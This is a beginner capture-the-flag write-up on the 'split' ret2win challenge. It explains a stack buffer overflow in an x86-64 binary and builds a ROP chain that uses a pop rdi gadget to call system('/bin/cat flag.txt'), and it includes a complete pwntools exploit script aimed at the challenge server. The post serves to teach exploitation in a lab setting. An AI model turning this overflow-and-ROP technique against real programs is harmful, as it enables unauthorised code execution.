---
title: "Split — ret2win with ROP pop rdi Gadget"
date: 2025-01-01
categories: ["CyberChallenge"]
series: ["CyberChallenge Italy"]
tags: ["pwn", "rop", "ret2win", "buffer-overflow", "x86-64", "pwntools"]
difficulty: "beginner"
summary: "Classic x86-64 ret2win: overflow the return address, use a pop rdi gadget to pass the /bin/cat flag.txt string as argument, jump to system."
---

## The Challenge

`split` is an x86-64 ELF with no PIE and no stack canary. The binary has `system` in its PLT and a `/bin/cat flag.txt` string somewhere in its data section. A buffer overflow in a `pwnme` function lets you overwrite the return address. The goal is to call `system("/bin/cat flag.txt")`.

## Approach

I ran `checksec` first: no canary, no PIE, NX enabled. That rules out shellcode on the stack and means I need ROP. `strings split | grep flag` immediately shows a `/bin/cat flag.txt` string in `.data` — that's suspicious, it's probably there on purpose.

I found the offset by sending `cyclic(200)` and watching the crash in GDB. The saved return address was overwritten at offset 38 (confirmed with `cyclic_find` on the value in RIP). My first chain just jumped straight to `system` — it crashed because the argument wasn't set. In x86-64, arguments go in registers, not on the stack. I needed to load the string address into `RDI` first.

`ropper -f split --search 'pop rdi'` found the gadget. Then the chain is: padding → `pop rdi; ret` → string address → `system`. Worked first try once the calling convention was right.

## Solution

```python
#!/usr/bin/env python3
from pwn import *

exe = context.binary = ELF(args.EXE or '/home/giordi/Downloads/split')

host = args.HOST or 'split.pwn.ccit25.chals.havce.it'
port = int(args.PORT or 14616)

def start_local(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

# Arch:     amd64-64-little
# RELRO:      Partial RELRO
# Stack:      No canary found
# NX:         NX enabled
# PIE:        No PIE (0x400000)
# Stripped:   No

io = start_local()

junk = b"A"*38
rop = ROP(exe)

pop_rdi = (rop.find_gadget(['pop rdi', 'ret']))[0]  # 0x0000000000400883
system = exe.sym["system"]                           # 0x00000000004005e0
cat_flag = next(exe.search(b'/bin/cat flag.txt'))    # 0x601060
rop = junk + p64(pop_rdi) + p64(cat_flag) + p64(system)

io.recvuntil(b"> ")
io.send(rop)
io.interactive()
```

`ROP(exe)` asks pwntools to find gadgets in the binary. `exe.search()` returns an iterator over all byte patterns in the binary file. `exe.sym["system"]` gives the PLT address for `system`. The `junk` variable is 38 bytes of padding, confirmed with cyclic. The final ROP chain overwrites the return address, pops the string address into RDI, then jumps to system.

## What I Learned

The `split` binary pattern is the canonical intro to x86-64 ROPs: the useful string and function already exist in the binary, the gadget is nearby, and the only skill being tested is understanding x86-64 calling conventions (first arg in RDI) versus x86 (first arg on stack).
